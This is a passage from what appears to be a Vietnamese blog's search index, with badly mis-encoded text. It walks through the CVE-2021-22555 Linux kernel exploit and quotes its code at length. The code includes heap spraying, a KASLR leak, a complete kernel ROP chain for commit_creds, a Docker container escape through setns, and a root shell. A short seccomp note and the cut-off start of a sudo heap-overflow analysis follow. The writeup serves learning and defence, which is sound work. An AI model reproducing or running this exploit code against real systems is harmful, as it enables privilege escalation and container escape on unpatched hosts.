0xFFFF00000000FFFF) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel heap address is incorrect.\\n\u0026#34;); goto err_rmid; BÆ°á»›c nÃ y cÄƒn báº£n giá»‘ng vá»›i thao tÃ¡c láº¥y Ä‘á»‹a chá»‰ cá»§a primary message truocs Ä‘Ã³, Ä‘iá»ƒm khÃ¡c suy nháº¥t lÃ  chÃºng ta cáº¥u trÃºc msg_msg Ä‘Æ°á»£c láº¥y ra tá»« Ä‘á»‹a chá»‰ PAGE_SIZE-MSG_MSG_SIZE STAGE 3: KASLR bypass Freeing fake secondary messages\u0026hellip; BÆ°á»›c nÃ y Ä‘Æ¡n gian gá»i láº¡i hÃ m free_skbuff Ä‘á»ƒ giáº£i phÃ³ng vÃ¹ng nhá»› cá»§a fake secondary messages.\n1 2 printf(\u0026#34;[*] Freeing fake secondary messages...\\n\u0026#34;); free_skbuff(ss, secondary_buf, sizeof(secondary_buf)); Spraying fake secondary messages\u0026hellip; 1 2 3 4 5 6 // Put kheap_addr at m_list_next \u0026amp; m_list_prev so that list_del() is possible. printf(\u0026#34;[*] Spraying fake secondary messages...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; ChÃºng ta xÃ¢y dá»±ng cáº¥u trÃºc msg_msg má»›i mÃ  á»Ÿ Ä‘Ã³, m_list_next vÃ  m_list_prev cÃ¹ng trá» vá» 1 Ä‘á»‹a chá»‰ lÃ  kheap_buff\nFreeing sk_buff data buffer\u0026hellip; 1 2 3 printf(\u0026#34;[*] Freeing sk_buff data buffer...\\n\u0026#34;); if (read_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), MTYPE_FAKE) \u0026lt; 0) goto err_rmid; Giáº£i phÃ³ng vÃ¹ng nhá»› mÃ  sk_buff trá» tá»›i báº±ng lá»‡nh read_msg\nSpraying pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 printf(\u0026#34;[*] Spraying pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (pipe(pipefd[i]) \u0026lt; 0) { perror(\u0026#34;[-] pipe\u0026#34;); goto err_rmid; } // Write something to populate pipe_buffer. if (write(pipefd[i][1], \u0026#34;pwn\u0026#34;, 3) \u0026lt; 0) { perror(\u0026#34;[-] write\u0026#34;); goto err_rmid; } } Khi pipe Ä‘Æ°á»£c gá»i, nÃ³ sáº½ gá»i hÃ m alloc_pipe_info() Ä‘á»ƒ cáº¥p phÃ¡t cÃ¡c vÃ¹ng nhá»› vá»›i cáº¥u trÃºc lÃ  struct pipe_buffer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/pipe.c struct pipe_inode_info *alloc_pipe_info(void) { ... unsigned long pipe_bufs = PIPE_DEF_BUFFERS; ... pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); if (pipe == NULL) goto out_free_uid; ... pipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT); ... } vÃ  cáº¥u trÃºc cá»§a struct pipe_buffer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h struct pipe_buffer { struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; struct pipe_buf_operations { ... /* * When the contents of this pipe buffer has been completely * consumed by a reader, -\u0026gt;release() is called. */ void (*release)(struct pipe_inode_info *, struct pipe_buffer *); ... }; chá»©a con trá» trá» tá»›i pipe_buf_operation. Máº·t khÃ¡c, khi Ä‘Æ°á»£c cáº¥p phÃ¡t, ops sáº½ trá» tá»›i má»™t static struct anon_pipe_buf_ops. Cáº¥u trÃºc nÃ y náº±m trong vÃ¹ng .data:\n1 2 3 4 5 6 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/pipe.c static const struct pipe_buf_operations anon_pipe_buf_ops = { .release = anon_pipe_buf_release, .try_steal = anon_pipe_buf_try_steal, .get = generic_pipe_buf_get, }; VÃ¬ khoáº£ng cÃ¡ch tá»« .data vá»›i .text luÃ´n khÃ´ng Ä‘á»•i, nÃªn tá»« Ä‘á»‹a chá»‰ anon_pipe_buf_ops chÃºng ta cÃ³ thá»ƒ tÃ­nh kernel base address. VÃ¬ váº­y, chÃºng ta spray Ä‘á»ƒ cáº¥p phÃ¡t cÃ¡c cáº¥u trÃºc pipe_buffer vá»›i má»¥c tiÃªu 1 cáº¥u trÃºc sáº½ náº±m ngay vá»‹ trÃ­ Ä‘Æ°á»£c struct sk_buff trá» tá»›i vá»«a Ä‘Æ°á»£c giáº£i phÃ³ng á»Ÿ bÆ°á»›c trÆ°á»›c.\nLeaking and freeing pipe_buffer object\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 printf(\u0026#34;[*] Leaking and freeing pipe_buffer object...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) { perror(\u0026#34;[-] read\u0026#34;); goto err_rmid; } if (*(uint64_t *)\u0026amp;secondary_buf[0x10] != MTYPE_FAKE) pipe_buffer_ops = *(uint64_t *)\u0026amp;secondary_buf[0x10]; } } kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS; printf(\u0026#34;[+] anon_pipe_buf_ops: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, pipe_buffer_ops); printf(\u0026#34;[+] kbase_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kbase_addr); if ((kbase_addr \u0026amp; 0xFFFF0000000FFFFF) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel base address is incorrect.\\n\u0026#34;); goto err_rmid; } ChÃºng ta dÃ¹ng 2 vÃ²ng for Ä‘á»ƒ Ä‘i qua táº¥t cáº£ cÃ¡c vÃ¹ng nhá»› mÃ  sk_buff trá» tá»›i, táº¡i Ä‘Ã¢y, ta Ä‘á»c dá»¯ liá»‡u, lÆ°u vÃ o vÃ¹ng Ä‘á»‡m secondary_buf táº¡i dÃ²ng 4. Táº¡i dÃ²ng sá»‘ 8 kiá»ƒm tra Ä‘á»ƒ xÃ¡c tÃ¬m vÃ¹ng nhá»› mÃ  chÃºng ta muá»‘n. MTYPE_FAKE lÃ  giÃ¡ trá»‹ Ä‘Æ°á»£c gÃ¡n cho msg-\u0026gt;mtype khi chÃºng ta táº¡o fake_msg_msg tá»« hÃ m build_msg_msg. Do Ä‘Ã³, vÃ¹ng nhá»› nÃ o cÃ³ giÃ¡ trá»‹ táº¡i secondary_buf[0x10] khÃ¡c vá»›i MTYPE_FAKE chÃ­nh lÃ  vÃ¹ng nhá»› chÃºng cá»§a pipe_buffer mÃ  chÃºng ta spray Ä‘Æ°á»£c. Ta láº¥y Ä‘á»‹a chá»‰ cá»§a vÃ¹ng nhá»› nÃ y táº¡i dÃ²ng 9 vÃ  lÆ°u vÃ o biáº¿n pipe_buffer_ops kbase_addr Ä‘Æ°á»£c tÃ­n tá»« cÃ´ng thá»©c á»Ÿ dÃ²ng 13, trong Ä‘Ã³: Äá»ƒ tÃ­nh ANON_PIPE_BUF_OPS ta tÃ­nh láº¥y Ä‘á»‹a chá»‰ anon_pipe_buf_ops vÃ  _text trong file /proc/kallsyms:\n1 2 3 4 5 root@ubuntu:/home/edisc/Desktop/cve-2021-22555/security-research/pocs/linux/cve-2021-22555# cat /proc/kallsyms | grep anon_pipe_buf_ops ffffffff9c878380 r anon_pipe_buf_ops root@ubuntu:/home/edisc/Desktop/cve-2021-22555/security-research/pocs/linux/cve-2021-22555# cat /proc/kallsyms | grep _text ffffffff9b800000 T _text ANON_PIPE_BUF_OPS = anon_pipe_buf_ops - _text STAGE 4: Kernel code execution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 printf(\u0026#34;[+] STAGE 4: Kernel code execution\\n\u0026#34;); printf(\u0026#34;[*] Spraying fake pipe_buffer objects...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); buf = (struct pipe_buffer *)\u0026amp;secondary_buf; buf-\u0026gt;ops = kheap_addr + 0x290; ops = (struct pipe_buf_operations *)\u0026amp;secondary_buf[0x290]; #ifdef KERNEL_COS_5_4_89 // RAX points to \u0026amp;buf-\u0026gt;ops. // RCX points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX; #elif KERNEL_UBUNTU_5_8_0_48 // RSI points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39; #endif build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; // Trigger pipe_release(). printf(\u0026#34;[*] Releasing pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (close(pipefd[i][0]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } if (close(pipefd[i][1]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } } printf(\u0026#34;[*] Checking for root...\\n\u0026#34;); if ((fd = open(\u0026#34;/etc/shadow\u0026#34;, O_RDONLY)) \u0026lt; 0) { printf(\u0026#34;[-] Error could not gain root privileges.\\n\u0026#34;); goto err_rmid; } close(fd); printf(\u0026#34;[+] Root privileges gained.\\n\u0026#34;); Spraying fake pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 printf(\u0026#34;[*] Spraying fake pipe_buffer objects...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); buf = (struct pipe_buffer *)\u0026amp;secondary_buf; buf-\u0026gt;ops = kheap_addr + 0x290; ops = (struct pipe_buf_operations *)\u0026amp;secondary_buf[0x290]; #ifdef KERNEL_COS_5_4_89 // RAX points to \u0026amp;buf-\u0026gt;ops. // RCX points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX; #elif KERNEL_UBUNTU_5_8_0_48 // RSI points to \u0026amp;buf. ops-\u0026gt;release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39; #endif build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; ChÃºng ta táº¡o má»™t fake pipe_buffer objects vá»›i kheap_addr + 0x290. Tiáº¿p theo, dÃ²ng 6-9 dÃ¹ng cho centos 5.4.89 vÃ  dÃ²ng 10-13 cho ubuntu 5.8.0.48 XÃ¢y dá»±ng má»™t kernel rop lÆ°u vÃ o secondary_buf vÃ  dÃ¹ng lá»‡nh spray_skbuff Ä‘á»ƒ Ä‘Æ°a kernel_rop cá»§a chÃºng ta vÃ o vÃ¹ng nhá»› Ä‘á»ƒ thá»±c thi. HÃ m build_krop Ä‘Æ°á»£c xÃ¢y dá»±ng nhÆ° sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 // Note: Must not touch offset 0x10-0x18. void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) { uint64_t *rop; #ifdef KERNEL_COS_5_4_89 *(uint64_t *)\u0026amp;buf[0x00] = kbase_addr + POP_RSP_POP_RBX_RET; rop = (uint64_t *)\u0026amp;buf[0x18]; // Save RBP at scratchpad_addr. *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R14_POP_RBP_RET; *rop++ = scratchpad_addr; // R14 *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_QWORD_PTR_R14_RBX_POP_RBX_POP_R14_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBX *rop++ = 0xDEADBEEF; // R14 *rop++ = 0xDEADBEEF; // RBP // commit_creds(prepare_kernel_cred(NULL)) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 0; // RDI *rop++ = kbase_addr + PREPARE_KERNEL_CRED; *rop++ = kbase_addr + POP_RDX_RET; *rop++ = 1; // RDX *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + COMMIT_CREDS; // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 1; // RDI *rop++ = kbase_addr + FIND_TASK_BY_VPID; *rop++ = kbase_addr + POP_RDX_RET; *rop++ = 1; // RDX *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + POP_RSI_RET; *rop++ = kbase_addr + INIT_NSPROXY; // RSI *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES; // Load RBP from scratchpad_addr and resume execution. *rop++ = kbase_addr + POP_RBP_RET; *rop++ = scratchpad_addr - 0x25; // RBP *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_25_POP_RBP_RET; *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET; #elif KERNEL_UBUNTU_5_8_0_48 *(uint64_t *)\u0026amp;buf[0x39] = kbase_addr + POP_RSP_RET; *(uint64_t *)\u0026amp;buf[0x00] = kbase_addr + ADD_RSP_D0_RET; rop = (uint64_t *)\u0026amp;buf[0xD8]; // Save RBP at scratchpad_addr. *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET; *rop++ = scratchpad_addr; // R12 *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBX *rop++ = 0xDEADBEEF; // R12 *rop++ = 0xDEADBEEF; // RBP // commit_creds(prepare_kernel_cred(NULL)) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 0; // RDI *rop++ = kbase_addr + PREPARE_KERNEL_CRED; *rop++ = kbase_addr + POP_RCX_RET; *rop++ = 4; // RCX *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET; *rop++ = kbase_addr + COMMIT_CREDS; // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) *rop++ = kbase_addr + POP_RDI_RET; *rop++ = 1; // RDI *rop++ = kbase_addr + FIND_TASK_BY_VPID; *rop++ = kbase_addr + POP_RCX_RET; *rop++ = 4; // RCX *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET; *rop++ = 0xDEADBEEF; // RBP *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET; *rop++ = kbase_addr + POP_RSI_RET; *rop++ = kbase_addr + INIT_NSPROXY; // RSI *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES; // Load RBP from scratchpad_addr and resume execution. *rop++ = kbase_addr + POP_RBP_RET; *rop++ = scratchpad_addr - 0xA; // RBP *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET; *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET; #endif } NguyÃªn táº¯c hoáº¡t Ä‘á»™ng cá»§a Kernel ROP chain lÃ : LÆ°u giÃ¡ trá»‹ cá»§a RBP táº¡i má»™t sá»‘ scratchpad address (scratchpad giá»‘ng nhÆ° má»™t máº«u giáº¥y ghi chÃº Ä‘á»ƒ lÆ°u trá»¯ nhá»¯ng kiáº¿n thá»©c táº¡m thá»i khi báº¡n Ä‘á»c 1 cuá»‘n sÃ¡ch) Ä‘á»ƒ sau nÃ y sá»­ dá»¥ng. Gá»i hÃ m commit_creds(prepare_kernel_cred(NULL)) Ä‘á»ƒ cÃ i Ä‘áº·t kernel credentials Gá»i hÃ m switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) Ä‘á»ƒ chuyá»ƒn khÃ´ng gian tÃªn namespace cá»§a process 1 thÃ nh má»™t trong nhá»¯ng init process. KhÃ´i phá»¥c láº¡i giÃ¡ trá»‹ cá»§a RBP vÃ  quay láº¡i luá»“ng thá»±c thi cÅ© (ngay sau hÃ m free_pipe_info()) Releasing pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Trigger pipe_release(). printf(\u0026#34;[*] Releasing pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (close(pipefd[i][0]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } if (close(pipefd[i][1]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } } printf(\u0026#34;[*] Checking for root...\\n\u0026#34;); if ((fd = open(\u0026#34;/etc/shadow\u0026#34;, O_RDONLY)) \u0026lt; 0) { printf(\u0026#34;[-] Error could not gain root privileges.\\n\u0026#34;); goto err_rmid; } close(fd); printf(\u0026#34;[+] Root privileges gained.\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); Sau khi Ä‘Ã£ xÃ¢y dá»±ng xong kernel_rop, chÃºng ta tiáº¿n hÃ nh giáº£i phÃ³ng cÃ¡c vÃ¹ng nhá»› pipe_buffer Ä‘á»ƒ kÃ­ch hoáº¡t hÃ m pipe_release(). BÆ°á»›c nÃ y ta dÃ¹ng vÃ²ng for Ä‘á»ƒ Ä‘i qua háº¿t táº¥t cáº£ cÃ¡c pipe filedescriptor vÃ  dÃ¹ng lá»‡nh close Ä‘á»ƒ giáº£i phÃ³ng vÃ¹ng nhá»›. dÃ²ng lá»‡nh 33-38 dÃ¹ng Ä‘á»ƒ kiá»ƒm tra xem liá»‡u chÃºng ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c root hay chÆ°a vÃ¬ tá»‡p /etc/shadow chá»‰ Ä‘Æ°á»£c Ä‘á»c bá»Ÿi root. STAGE 5: Post-exploitation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 printf(\u0026#34;[+] STAGE 5: Post-exploitation\\n\u0026#34;); printf(\u0026#34;[*] Escaping container...\\n\u0026#34;); setns(open(\u0026#34;/proc/1/ns/mnt\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/pid\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/net\u0026#34;, O_RDONLY), 0); printf(\u0026#34;[*] Cleaning up...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { // TODO: Fix next pointer. if (i == fake_idx) continue; if (msgctl(msqid[i], IPC_RMID, NULL) \u0026lt; 0) perror(\u0026#34;[-] msgctl\u0026#34;); } for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { if (close(ss[i][0]) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); if (close(ss[i][1]) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); } if (close(s) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); printf(\u0026#34;[*] Popping root shell...\\n\u0026#34;); char *args[] = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;, NULL}; execve(args[0], args, NULL); return 0; ÄÃ¢y lÃ  Ä‘oáº¡n lá»‡nh cho phÃ©p chÃºng ta thoÃ¡t khá»i docker. Khi Ä‘Ã£ cÃ³ root, chÃºng ta tiáº¿n hÃ nh thay Ä‘á»•i mnt, pid, net namespace Ä‘á»ƒ cho phÃ©p chÃºng ta thoÃ¡t khá»i container. Äoáº¡n lá»‡nh 4-6 thá»±c hiá»‡n sá»± thay Ä‘á»•i nÃ y. Äoáº¡n lá»‡nh tá»« dÃ²ng 8-23 thá»±c hiá»‡n thao tÃ¡c dá»n dáº¹p cÃ¡c message queue, Ä‘Ã³ng táº¥t cáº£ cÃ¡c socketpair. Cuá»‘i cÃ¹ng thá»±c hiá»‡n lá»‡nh Ä‘á»ƒ cháº¡y shell cá»§a root dÃ²ng 25-27 TÃ³m láº¡i BÃ i nÃ y tÃ´i chá»‰ viáº¿t láº¡i tá»« bÃ i viáº¿t chÃ­nh cá»§a tÃ¡c giáº£, thÃªm vÃ o Ä‘Ã³, lÃ  nhá»¯ng giáº£i thÃ­ch cá»§a tÃ´i vá» nhá»¯ng váº¥n Ä‘á» tÃ¡c giáº£ chÆ°a nÃ³i rÃµ hoáº·c quÃ¡ cÄƒn báº£n vá»›i tÃ¡c giáº£ nhÆ°ng khÃ´ng há» vá»›i tÃ´i. VÃ¬ kiáº¿n thá»©c tÃ´i cÃ²n háº¡n cháº¿, nÃªn nhá»¯ng giáº£i thÃ­ch cÃ³ thá»ƒ Ä‘Ãºng hoáº·c sai, náº¿u sai, ráº¥t mong nháº­n Ä‘Æ°á»£c sá»± gÃ³p Ä‘á»ƒ hoÃ n thiá»‡n hÆ¡n. Lá»i cuá»‘i, chÃ¢n thÃ nh cáº£m Æ¡n sá»± cá»‘ng hiáº¿n cá»§a tÃ¡c giáº£ - Andy Nguyen (theflow@) - Ä‘áº·c biá»‡t poc cá»§a anh, Ä‘Ã£ giÃºp tÃ´i ráº¥t nhiá»u trong quÃ¡ trÃ¬nh nÃ¢ng cao kÄ© nÄƒng cá»§a mÃ¬nh. Nguá»“n tham kháº£o CVE-2021-22555: Turning \\x00\\x00 into 10000$ CVE-2021-22555: Linux kernel privilege escalation causes Docker to escape ","description":"Lá»—i heap out-of-bound","id":11,"section":"posts","tags":["cve,  escape_docker"],"title":"TÃ¬m hiá»ƒu vá» CVE-2021-22555","uri":"https://minhlongmt183.github.io/posts/cve-2021-22555/"},{"content":"Docker security Docker security non-events Protect the Docker daemon socket Using certificates for repository client verification User trusted images Antivirus software AppArmor security profiles Seccomp security profiles Cháº¿ Ä‘á»™ Ä‘iá»‡n toÃ¡n an toÃ n Secure computing mode (seccomp) lÃ  má»™t tÃ­nh nÄƒng cá»§a Linux kernel, dÃ¹ng Ä‘á»ƒ háº¡n cháº¿ má»™t sá»‘ action trong container. HÃ m seccomp() system call dÃ¹ng Ä‘á»ƒ xá»­ lÃ­ tráº¡ng thÃ¡i cá»§a seccomp.\n","description":"Docker Security","id":12,"section":"posts","tags":["Docker"],"title":"TÃ¬m hiá»ƒu vÃ  sá»­ dá»¥ng docker (P8)","uri":"https://minhlongmt183.github.io/posts/docker_p8/"},{"content":"\rBÃ i viáº¿t nÃ y nháº±m má»¥c Ä‘Ã­ch ghi láº¡i nhá»¯ng kiáº¿n thá»©c Ä‘Ã£ há»c Ä‘á»ƒ nhá»› vÃ  hiá»ƒu rÃµ hÆ¡n.\rTá»•ng quan Lá»—i cá»§a CVE nÃ y thuá»™c loáº¡i heap-based buffer overflow trong sudo. Cá»¥ thá»ƒ:\nNÃ³ cho phÃ©p ngÆ°á»i dÃ¹ng bÃ¬nh thÆ°á»ng láº¥y Ä‘Æ°á»£c root mÃ  khÃ´ng cáº§n biáº¿t máº­t kháº©u cá»§a root. Nhá»¯ng phiÃªn báº£n bá»‹ áº£nh hÆ°á»Ÿng: legacy cÃ³ phiÃªn báº£n cá»§a sudo tá»« 1.8.2 - 1.8.31p2 stable cÃ³ phiÃªn báº£n cá»§a sudo tá»« 1.9.0 - 1.9.5p1 Trong bÃ i viáº¿t nÃ y, tÃ´i tiáº¿n hÃ nh khai thÃ¡c trÃªn Ubuntu 18.04.5 LTS cÃ³ phiÃªn báº£n cá»§a sudo: 1 2 3 4 5 6 edisc@ubuntu:~$ sudo -V Sudo version 1.9.5p1 Sudoers policy plugin version 1.9.5p1 Sudoers file grammar version 48 Sudoers I/O plugin version 1.9.5p1 Sudoers audit plugin version 1.9.5p1 PhÃ¢n tÃ­ch Bá»©c tranh sÆ¡ lÆ°á»£c Khi Sudo Ä‘Æ°á»£c thá»±c thi á»Ÿ cháº¿ Ä‘á»™ command line: Náº¿u sá»­ dá»¥ng tÃ¹y chá»n -s, thÃ¬ Sudo's MODE_SHELL flag sáº½ Ä‘Æ°á»£c báº­t. Náº¿u sá»­ dá»¥ng tÃ¹y chá»n -i, thÃ¬ Sudo's MODE_SHELL vÃ  MODE_LOGIN_SHELL flags sáº½ Ä‘Æ°á»£c báº­t. Khi thá»±c thi, báº¯t Ä‘áº§u hÃ m main() cá»§a Sudo, hÃ m parse_args() sáº½ viáº¿t láº¡i argv (dÃ²ng 609-617) báº±ng cÃ¡ch ná»‘i táº¥t cáº£ cÃ¡c command-line arguments (dÃ²ng 587-595) vÃ  thÃªm vÃ o trÆ°á»›c cÃ¡c kÃ­ tá»± Ä‘áº·c biá»‡t má»™t dáº¥u backslashes \\. (dÃ²ng 590-591): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 571 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { 572 char **av, *cmnd = NULL; 573 int ac = 1; ... 581 cmnd = dst = reallocarray(NULL, cmnd_size, 2); ... 587 for (av = argv; *av != NULL; av++) { 588 for (src = *av; *src != \u0026#39;\\0\u0026#39;; src++) { 589 /* quote potential meta characters */ 590 if (!isalnum((unsigned char)*src) \u0026amp;\u0026amp; *src != \u0026#39;_\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;-\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;$\u0026#39;) 591 *dst++ = \u0026#39;\\\\\u0026#39;; 592 *dst++ = *src; 593 } 594 *dst++ = \u0026#39; \u0026#39;; 595 } ... 600 ac += 2; /* -c cmnd */ ... 603 av = reallocarray(NULL, ac + 1, sizeof(char *)); ... 609 av[0] = (char *)user_details.shell; /* plugin may override shell */ 610 if (cmnd != NULL) { 611 av[1] = \u0026#34;-c\u0026#34;; 612 av[2] = cmnd; 613 } 614 av[ac] = NULL; 615 616 argv = av; 617 argc = ac; 618 } Sau Ä‘Ã³, trong hÃ m sudoers_policy_main(), hÃ m set_cmnd() ná»‘i táº¥t cáº£ cÃ¡c command-line arguments vÃ o heap-based buffer \u0026quot;user_args\u0026quot; (dÃ²ng) 864-871) vÃ  bá» qua kÃ­ tá»± \\ dÃ²ng 866-867. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 819 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { ... 852 for (size = 0, av = NewArgv + 1; *av; av++) 853 size += strlen(*av) + 1; 854 if (size == 0 || (user_args = malloc(size)) == NULL) { ... 857 } 858 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { ... 864 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { 865 while (*from) { 866 if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) 867 from++; 868 *to++ = *from++; 869 } 870 *to++ = \u0026#39; \u0026#39;; 871 } ... 884 } ... 886 } Náº¿u command-line argument káº¿t thÃºc vá»›i single backslash: Táº¡i dÃ²ng 866, from[0] = '\\\\' vÃ  from[1]=NULL. Táº¡i dÃ²ng 867, from tÄƒng 1 Ä‘Æ¡n vá»‹, from trá» tá»›i NULL - from=NULL. Táº¡i dÃ²ng 868, NULL sáº½ Ä‘Æ°á»£c copy vÃ o user_args buffer, vÃ  from tÄƒng 1 Ä‘Æ¡n vá»‹, trá» Ä‘áº¿n giÃ¡ trá»‹ sau NULL (out of the argument\u0026rsquo;s bounds). VÃ²ng láº·p while táº¡i dÃ²ng 865-869 sáº½ Ä‘á»c vÃ  copy vÃ¹ng dá»¯ liá»‡u out-of-bounds vÃ o user_args buffer. Dá»… tháº¥y, set_cmnd() lÃ  nguyÃªn nhÃ¢n dáº«n tá»›i lá»— há»•ng heap-based buffer overflow, bá»Ÿi vÃ¬ vÃ¹ng dá»¯ liá»‡u out-of-bounds Ä‘Ã£ Ä‘Æ°á»£c copy vÃ o user_args buffer, tuy nhiÃªn nÃ³ láº¡i khÃ´ng chá»‰ Ä‘á»‹nh kÃ­ch thÆ°á»›c cá»§a chÃºng (kÃ­ch thÆ°á»›c Ä‘Æ°á»£c tÃ­nh toÃ¡n táº¡i dÃ²ng 852-853) Vá» lÃ­ thuyáº¿t, khÃ´ng cÃ³ command-line argument nÃ o cÃ³ thá»ƒ káº¿t thÃºc báº±ng dáº¥u \\ bá»Ÿi vÃ¬: Náº¿u MODE_SHELL hay MODE_LOGIN_SHELL Ä‘Æ°á»£c báº­t (line 858 - Ä‘iá»u kiá»‡n cáº§n 